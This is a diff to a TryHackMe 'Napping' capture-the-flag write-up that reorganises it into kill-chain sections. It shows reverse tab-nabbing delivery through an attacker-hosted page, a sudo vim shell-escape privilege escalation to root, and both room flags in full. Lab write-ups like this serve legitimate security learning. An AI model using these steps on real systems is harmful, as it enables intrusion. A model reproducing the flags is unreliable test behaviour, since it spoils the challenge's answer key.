@@ -14,18 +14,6 @@ Can be accessed clicking  <a href="https://tryhackme.com/room/nappingis1337">her
 <p>To hack into this machine, you must look at the source and focus on the target.</p>
 
 <br>
-
-<p><em>Answer the questions below</em></p>
-
-<p>1.1. What is the user flag?<br>
-<code>THM{Wh@T_1S_Tab_NAbbiN6_&_PrinCIPl3_of_L3A$t_PriViL36E}</code></p>
-
-<br>
-
-<p>1.2. What is the root flag?<br>
-<code>THM{Adm1n$_jU$t_c@n'T_stAy_Aw@k3_T$k_tsk_tSK}</code></p>
-
-<br>
 <br>
 
 <h1>Reconnaissance</h1>
@@ -152,7 +140,7 @@ TargetIP
 
 <img width="1118" height="424" alt="image" src="https://github.com/user-attachments/assets/8397663a-6ba7-4c5e-810d-11221c10efcb" />
 
-
+<h1>Weaponization</h1>
 <h3>HackTricks</h3>
 <p>https://hacktricks.boitatech.com.br/pentesting-web/reverse-tab-nabbing</p>
 
@@ -184,17 +172,18 @@ TargetIP
   </script>
  </body>
 </html>
-
 ```
 
-
-<h3>Action</h3>
+<h1>Delivery</h1>
 <p>
 
 - entered <code>http://AttackIP:4444/hello.html</code><br>
 - clicked <code>Submit</code>
 - clicked <code>Here</code>
 </p>
+
+<h1>Exploitation & Installation</h1>
+<p>
 
 <h3>http servers</h3>
 
@@ -227,7 +216,7 @@ TargetIP - - [xx/Jul/2025 xx:xx:xx] "GET /login.html HTTP/1.1" 200 -
 
 <img width="760" height="160" alt="image" src="https://github.com/user-attachments/assets/731d2ba3-d0f5-40ba-a344-2c4383b2cda0" />
 
-
+<h1>Command & Control</h1>
 <h3>ssh</h3>
 
 ```bash
@@ -336,6 +325,18 @@ User adrian may run the following commands on ip-10-10-89-107:
     (root) NOPASSWD: /usr/bin/vim
 adrian@ip-10-10-89-107:~$ sudo /usr/bin/vim -c ':!/bin/sh'
 ```
+
+<h1>Actions and Objectives</h1>
+<p><em>Answer the questions below</em></p>
+
+<p>1.1. What is the user flag?<br>
+<code>THM{Wh@T_1S_Tab_NAbbiN6_&_PrinCIPl3_of_L3A$t_PriViL36E}</code></p>
+
+<br>
+
+<p>1.2. What is the root flag?<br>
+<code>THM{Adm1n$_jU$t_c@n'T_stAy_Aw@k3_T$k_tsk_tSK}</code></p>
+
 
 ```bash
 :!/bin/sh
